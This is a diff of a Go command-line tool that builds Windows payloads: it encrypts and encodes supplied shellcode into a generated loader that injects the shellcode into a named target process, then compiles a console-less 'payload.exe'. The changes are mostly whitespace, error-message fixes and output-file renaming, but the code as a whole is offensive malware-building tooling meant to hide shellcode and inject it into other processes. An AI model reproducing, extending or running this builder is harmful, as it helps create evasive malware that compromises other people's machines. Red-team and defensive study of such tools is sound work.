@@ -36,6 +36,7 @@ const ASCII_ART = `
 
     `
 
+
 func GetParser(opts *Options) *cobra.Command {
 
 	version := "2.0.0"
@@ -47,20 +48,20 @@ func GetParser(opts *Options) *cobra.Command {
 		Long:               ASCII_ART,
 		Run: func(cmd *cobra.Command, args []string) {
 
-			/* obligatory skid ascii art */
-			fmt.Printf("%s\n\n", ASCII_ART)
+            /* obligatory skid ascii art */
+            fmt.Printf("%s\n\n", ASCII_ART)
 
 			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
 			err := tools.CreateTmpProjectRoot(opts.Outdir)
 			if err != nil {
-				fmt.Printf("[!] Error generating project root: %s", err)
+				fmt.Printf("[!] Error generating project root: %s\n", err)
 				os.Exit(1)
 			}
 
 			/* reading the shellcode as a series of bytes */
 			shellcode, err := tools.ReadFile(opts.ShellcodePath)
 			if err != nil {
-				fmt.Printf("[!] Error reading shellcode file: %s", err.Error())
+				fmt.Printf("[!] Error reading shellcode file: %s\n", err.Error())
 				os.Exit(1)
 			}
 
@@ -69,12 +70,12 @@ func GetParser(opts *Options) *cobra.Command {
 				opts.Key = tools.RandomString(32)
 			}
 
-			fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)
+            fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)
 
 			/* encoding defines the way the series of bytes will be written into the template */
 			encType := tools.SelectRandomEncodingType()
 
-			fmt.Printf("\tEncoding into template with [%s]\n", encType.String())
+            fmt.Printf("\tEncoding into template with [%s]\n", encType.String())
 
 			/*
 			   depending on encryption type, we do the following:
@@ -122,14 +123,14 @@ func GetParser(opts *Options) *cobra.Command {
 
 			/* TODO: add support for more exec templates */
 			err = tools.WriteToFile(opts.Outdir, "exec.go", loaders.GetCRTTemplate(opts.Target))
-			if err != nil {
+            if err != nil {
 				panic(err)
 			}
 
 			os.Setenv("GOOS", opts.OS)
 			os.Setenv("GOARCH", opts.arch)
 
-			fmt.Printf("\n[+] Template (CRT) written to tmp directory. Compiling...\n")
+            fmt.Printf("\n[+] Template (CRT) written to tmp directory. Compiling...\n")
 
 			execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
 			execCmd.Dir = opts.Outdir
@@ -137,26 +138,34 @@ func GetParser(opts *Options) *cobra.Command {
 			_, stderr := execCmd.Output()
 
 			if stderr != nil {
-				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
-				fmt.Printf(
-					"\nYou may try to run the following command in %s to find out what happend: %s\n\n",
-					opts.Outdir,
-					"go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
-				)
+                fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
+                fmt.Printf(
+                    "\nYou may try to run the following command in %s to find out what happend: GOOS=%s GOARCH=%s %s\n\n",
+                    opts.Outdir,
+                    opts.OS,
+                    opts.arch,
+                    "go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
+                )
 
-				fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
+                fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
 				os.Exit(1)
 			}
 
-			println("[+] Done! You may find your payload in the out-directory...")
+            fullpath := fmt.Sprintf("%s/payload.exe", opts.Outdir)
+            finalName := fmt.Sprintf("./%s.exe", opts.Outdir)
+            tools.MoveFile(fullpath, finalName)
+
+            os.RemoveAll(opts.Outdir)
+
+            println("[+] Done!")
 		},
 	}
 
 	defaults := GetDefaultCLIOptions()
 
-	cmd.PersistentFlags().StringVarP(&opts.Outdir, "outdir", "f", defaults.Outdir, "output directory")
+	cmd.PersistentFlags().StringVarP(&opts.Outdir, "out", "f", defaults.Outdir, "output name")
 	cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
-	cmd.PersistentFlags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
+    cmd.PersistentFlags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
 
 	cmd.PersistentFlags().StringVarP(&opts.arch, "arch", "r", defaults.arch, "architecture compilation target")
 	cmd.PersistentFlags().StringVarP(&opts.OS, "os", "o", defaults.OS, "OS compilation target")
